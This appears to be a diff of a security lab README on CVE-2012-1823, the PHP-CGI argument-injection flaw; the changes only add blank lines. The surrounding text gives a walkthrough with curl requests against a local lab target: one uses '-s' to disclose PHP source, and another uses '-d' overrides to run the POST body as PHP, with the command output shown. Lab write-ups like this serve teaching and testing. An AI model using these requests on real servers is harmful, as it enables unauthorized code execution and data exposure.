@@ -5,6 +5,7 @@
 CVE-2012-1823 is an infamous remote code execution vulnerability in PHP running in CGI mode (`php-cgi`) affecting PHP versions prior to 5.3.12 and 5.4.2 (with similar argument injection patterns resurfacing in CVE-2024-4577).
 
 According to RFC 3875 (CGI specification), query strings in HTTP requests that do not contain an unencoded equals sign (`=`) are split on whitespace and passed directly as command-line arguments to the CGI executable. When `php-cgi` receives command-line switches, an attacker can pass dangerous runtime flags directly via the URL:
+
 - `-s`: Disclose the syntax-highlighted PHP source code of the targeted file.
 - `-d`: Dynamically override PHP configuration directives (`ini_set`), such as enabling `allow_url_include=on` and `auto_prepend_file=php://input`.
 
@@ -20,6 +21,7 @@ By combining these flags, an unauthenticated attacker can read any PHP source co
 ## Exploitation Walkthrough
 
 ### 1. Arbitrary Source Code Disclosure (`-s`)
+
 Request the target PHP script with the `-s` query string:
 
 ```bash
@@ -29,6 +31,7 @@ curl -s 'http://localhost:8132/index.php?-s'
 The server returns the full syntax-highlighted PHP source code of `index.php`.
 
 ### 2. Remote Code Execution via Configuration Override (`-d`)
+
 Inject PHP configuration directives to evaluate the HTTP POST request body as PHP code:
 
 ```bash
@@ -37,6 +40,7 @@ curl -s -X POST 'http://localhost:8132/index.php?-d+allow_url_include%3don+-d+au
 ```
 
 Output:
+
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 Linux cyberlab_02_php_cgi_rce ...
